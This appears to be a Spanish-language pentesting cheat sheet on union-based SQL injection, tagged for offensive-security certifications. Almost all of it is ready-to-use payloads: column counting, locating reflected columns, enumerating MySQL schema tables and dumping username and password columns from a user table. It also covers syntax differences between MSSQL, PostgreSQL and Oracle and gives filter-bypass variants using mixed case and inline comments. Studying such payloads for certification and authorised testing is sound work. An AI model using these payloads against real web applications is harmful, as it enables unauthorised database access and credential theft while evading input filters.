---
title: SQL Injection - Union based
tags: [web, sqli, oscp, cpts, ewptx]
---

## Detectar el número de columnas

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' UNION SELECT NULL,NULL-- -
```

## Encontrar columnas que reflejan texto

```sql
' UNION SELECT 'a',NULL-- -
' UNION SELECT NULL,'a'-- -
```

## Extraer datos (MySQL)

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='usuarios'-- -
' UNION SELECT username,password FROM usuarios-- -
```

## Variantes por motor

- **MSSQL**: `information_schema` también existe; concatenar con `+`.
- **PostgreSQL**: usar `||` para concatenar, `version()` para fingerprint.
- **Oracle**: requiere `FROM dual` en selects sin tabla.

## Bypass de filtros comunes

```sql
UniOn SeLect          -- case
/*!UNION*/ /*!SELECT*/ -- comentarios inline (MySQL)
UNI/**/ON SEL/**/ECT   -- espacios con comentarios
```
